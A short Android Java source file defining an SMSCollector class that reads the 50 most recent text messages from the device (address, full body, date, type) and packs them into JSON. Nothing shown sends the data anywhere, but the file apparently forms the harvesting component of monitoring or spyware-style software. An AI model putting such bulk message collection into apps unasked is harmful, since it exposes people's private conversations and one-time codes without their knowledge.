package com.alzahra.data;

import android.content.ContentResolver;
import android.content.Context;
import android.database.Cursor;
import android.net.Uri;
import android.provider.Telephony;

import org.json.JSONArray;
import org.json.JSONObject;

public class SMSCollector {
    private Context context;

    public SMSCollector(Context ctx) {
        this.context = ctx;
    }

    public JSONArray collectSMS() {
        JSONArray messages = new JSONArray();
        try {
            ContentResolver cr = context.getContentResolver();
            Cursor cursor = cr.query(Telephony.Sms.CONTENT_URI, null, null, null, 
                Telephony.Sms.DATE + " DESC LIMIT 50");
            
            if (cursor != null) {
                while (cursor.moveToNext()) {
                    JSONObject msg = new JSONObject();
                    msg.put("address", cursor.getString(cursor.getColumnIndexOrThrow(Telephony.Sms.ADDRESS)));
                    msg.put("body", cursor.getString(cursor.getColumnIndexOrThrow(Telephony.Sms.BODY)));
                    msg.put("date", cursor.getLong(cursor.getColumnIndexOrThrow(Telephony.Sms.DATE)));
                    msg.put("type", cursor.getInt(cursor.getColumnIndexOrThrow(Telephony.Sms.TYPE)));
                    messages.put(msg);
                }
                cursor.close();
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
        return messages;
    }
}
